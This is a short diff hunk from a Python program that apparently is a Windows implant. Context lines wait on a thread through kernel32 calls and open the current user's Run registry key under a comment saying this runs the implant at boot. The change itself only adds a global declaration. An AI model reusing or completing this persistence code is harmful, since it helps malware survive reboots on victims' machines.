@@ -50,6 +50,8 @@ def execute()
 	
 	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 	
+	global PATH
+	
 	# Reg key to run implant at boot
 	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
 	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE)
